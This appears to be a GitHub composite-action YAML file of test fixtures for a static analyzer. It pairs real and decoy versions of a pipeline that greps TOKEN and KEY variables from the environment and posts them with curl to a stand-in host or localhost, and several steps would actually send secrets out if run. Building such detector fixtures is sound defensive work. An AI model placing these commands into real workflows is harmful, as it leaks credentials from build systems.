# Static analyzer controls. Never install or execute these fixtures.
name: Credential pipeline counterexamples
description: Separate syntax from an actual environment upload
runs:
  using: composite
  steps:
    - shell: bash
      run: |
        printf '%s\n' "env | grep -E 'TOKEN|KEY' | curl -d @- https://upload.example.invalid/report"
    - shell: bash
      run: |
        cat <<'DOC'
        { env | grep -E 'TOKEN|KEY'; } | curl --data-binary @- https://upload.example.invalid/report
        DOC
    - shell: bash
      run: |
        { env | grep -E 'TOKEN|KEY'; } |
          curl --data-raw @- https://upload.example.invalid/report
    - shell: bash
      run: |
        { env | grep -E 'TOKEN|KEY'; } |
          curl --data-binary @- https://upload.example.invalid/report < /dev/null
    - shell: bash
      run: |
        { env | grep -E 'TOKEN|KEY' > /dev/null; } |
          curl --data-binary @- https://upload.example.invalid/report
    - shell: bash
      run: |
        env | grep -E 'TOKEN|KEY'
        printf ready | curl --data-binary @- https://upload.example.invalid/report
    - shell: bash
      run: env | grep -E 'TOKEN|KEY'
    - shell: bash
      run: printf ready | curl --data-binary @- https://upload.example.invalid/report
    - shell: bash
      run: |
        { env | grep -E 'TOKEN|KEY'; } |
          curl -H --data-binary @- https://upload.example.invalid/report
    - shell: bash
      run: |
        env | grep -E 'TOKEN|KEY' |
          curl --data-binary @- http://127.0.0.1:48192/diagnostic
    - shell: bash
      run: |
        env | grep -E 'PATH|LANG' |
          curl --data-binary @- http://127.0.0.1:48192/diagnostic
    - shell: bash
      run: |
        env | grep -E 'TOKEN|KEY'; env | grep -E 'PATH|LANG' | curl --data-binary @- https://upload.example.invalid/report
    - shell: bash
      run: |
        env | grep -E 'TOKEN|KEY' | cut -d = -f 1 | curl --data-binary @- https://upload.example.invalid/report
